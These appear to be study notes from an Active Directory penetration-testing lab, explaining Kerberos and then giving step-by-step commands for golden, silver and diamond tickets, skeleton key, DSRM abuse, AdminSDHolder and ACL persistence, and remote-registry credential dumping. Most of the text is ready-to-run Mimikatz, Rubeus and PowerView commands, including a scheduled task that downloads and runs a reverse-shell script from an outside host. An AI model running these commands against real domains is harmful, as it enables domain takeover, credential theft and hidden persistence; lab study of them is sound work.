# Kerberos Working
- AS-REQ: The client asks TGT from the authentication server by sending an encrypted timestamp along with the request.
- AS-REP: The authentication server verifies if it is a known client and if it is a known client it sends an encrypted TGT as confirmation.(This TGT is encrypted using password hash of krbtgt account)
- TGS-REQ: The client sends the encrypted TGT along with SPN(alex\MYSQLcomputer$@domain.local) to Ticket granting server as a proof that he/she/it is a known client and wants to access some service(SPN).
- TGS-REP: The ticket granting server verifies the TGT and sends a service ticket for that service(service ticket is encrypted with ntlm hash of the service and can be harvested and cracked offline which is known as kerberoasting attack also the TGS doesn't check if client has access to the requested service)
- AP-REQ: Now, the client has ST he/she/it sends ST to that service requesting for access.
-AP-REP: The service verifies if the client is allowed to access it or not by decrypting the ST and grants or denies access.

# Golden Ticket
In second step(AS-REP) since the TGT which is sent to the client as a proof that this client/service/computer exists on the domain and is legitimate and this TGT is encrypted with hash of krbtgt account, If we have hash of krbtgt account we can forge TGT ourselves that means we can create our own TGT impersonating as any client(ex: Domain Admin), service or computer.

- First extract aes key of krbtgt account on DC using mimikatz,safetykatz or any other variant.
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```
- Using DCSync feature for getting the same AES keys as above with DA privilege or user with replication rights
```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
- After getting the aes key for krbtgt run the following on any machine that has connectivity with DC. From that machine later winrs to dc since /ptt means to inject the ticket into current powershell process can also use /ticket to save it to a file for later use.
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
- You can get SID of domain using PowerView itself

# Silver Ticket
Golden ticket provides access to any machine while silver ticket provides access to particular service on a particular machine for which the silver ticket is created. Silver ticket means forging our own service ticket since Service ticket is signed and encrypted by the hash of service account(machine account in this case DCORP-DC$ since service runs on machine) if we get hash of machine account on which that particular service is running on we can forge our own service ticket and access that service on that machine later. So if we have administrative access on any machine 

## Note
All service accounts http(powershell remoting), cifs, rpcss, ldap, wmi all services use machine account as a service account ex: dcorp-dc$, dcorp-adminsrv$, dcorp-student$

Using hash of the Domain Controller computer account, below command provides access to file system on the DC.
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
There are various ways of achieving command execution using Silver tickets. Creating a silver ticket for the HOST SPN which will allow us to schedule a task on the target:
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
```
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
```

# Diamond Ticket
A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypting it using AES key of krbtgt account.Note: golden ticket was tgt forging attack while diamond ticket is tgt modification attack. A diamond ticket is more opsec safe. Here, If we have hash of krbtgt account we can forge TGT ourselves that means we can modify and create our own TGT impersonating as any client(ex: Domain Admin, student user), service or computer.
```
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
# Skeleton Key
It is an attack where it is possible to patch a domain controller(lsass process) so that it allows access as any user with a single password. Below the password would be mimikatz on the domain controller of choice.
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
Now, it is possible to access any machine with a valid username and password as "mimikatz"
```
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```

# DSRM(Directory Services Restore Mode)
There is a local administrator on every Domain Controller named Administrator whose password is the DSRM password DSRM password also known as SafeMode Password is needed when a server is prompted to a domain controller and it is rarely changed. After altering the configuration on DC it is possible to pass the NTLM hash of this user to access the DC.

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
```
Then on DC
```
Enter-PSSession -Computername dcorp-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
Then, pass the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
ls \\dcorp-dc\C$
```
# AdminSDHolder

AdminSDHolder is a security mechanism in AD where primary its purpose is to ensure that high-privilege accounts, such as members of built-in administrative groups like Domain Admins, Enterprise Admins, and Schema Admins, Backup Operators, Server Operators, Print Operators, Replicators remain secure and are not inadvertently granted excessive permissions or are tampered with. For example for preststance if an attacker modifies Domain Admins group to have full control by student user the Security Descriptor Propagator (SDPROP) would run every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolderand any differences are overwritten on the object ACL meaning the changes made by attacker would not be viable after an hour. With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually beinga member of it. 

- Add FullControlpermissions for a user to the AdminSDHolderusing PowerViewas DA:
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
- Abusing FullControl using powerview
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```
- Reset password for a user to AdminSDHolder
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
- Invoke the SDPropagator manually
```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```
- Abuse reset password using powerview
```
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```
# Rights abuse
With Domain Admin privilege we can modify ACL of domain root to allow student1 user the ability to perform dcsync by providing access to replication rights.

- Adding rights for dcsync for student1 user using powerview
```
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose 
```
# Persistance using ACLs - Security Descriptors
With DA privilege it is posible to make changes to ACLs aka modify owner, primary group, dacl(read,write,execute,delete,full control) of multiple remote access methods to allow access to non admin  users. 

- Using RACE tool
```
. C:\AD\Tools\RACE-master\RACE.ps1
```
- On local machine for student1:
```
Set-RemoteWMI -SamAccountName student1 -Verbose
```
- On remote machine for student1 without explicit credentials:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
- On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
```
- On remote machine remove permissions:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Remove -Verbose
```
# Persistance using ACLs - Remote Registry
- Using RACE 
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```
- As student1, retrieve machine account hash:
```
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```
- Retrieve local account hash:
```
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```
- Retrieve domain cached credentials:
```
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```
